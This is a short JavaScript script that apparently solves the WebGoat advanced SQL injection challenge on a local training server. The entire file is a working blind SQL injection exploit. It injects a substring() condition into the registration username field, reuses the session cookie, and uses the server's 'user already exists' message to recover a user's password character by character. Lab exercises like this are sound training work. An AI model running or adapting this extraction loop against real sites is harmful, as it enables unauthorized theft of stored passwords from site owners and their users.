let password = null;
let alphabet = [..."abcdefghijklmnopqrstuvwxyz".split(""), ""];
let pause = false;
const findPassword = async () => {
  let guestNumIndex = 1;
  let alphabetIndex = 0;

  while (!pause) {
    const guestNumValue = alphabet[alphabetIndex++];
    const formData = new FormData();
    formData.append(
      "username_reg",
      `tom\' AND substring(password,${guestNumIndex},1)=\'${guestNumValue}`
    );

    formData.append("email_reg", "test@.com");
    formData.append("password_reg", "1");
    formData.append("confirm_password_reg", "1");
    const cookies = document.cookie
      .split(";")
      .map((cookie) => cookie.trim().split("="))
      .filter(([key, _]) => {
        return key === "JSESSIONID";
      })[0][1];

    try {
      const response = await fetch(
        "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge",
        {
          method: "PUT",
          headers: {
            Cookie: cookies,
          },
          body: formData,
        }
      );

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      const data = await response.json();
      if (
        data.feedback ===
        `User {0} already exists please try to register with a different username.`
      ) {
        password = (password || "") + guestNumValue;
        alphabetIndex = 0;
        guestNumIndex++;
        if (guestNumValue === "") pause = true;
      }
    } catch (error) {
      console.error("Error:", error);
    }
  }

  console.log("Final password:", password);
};

findPassword();
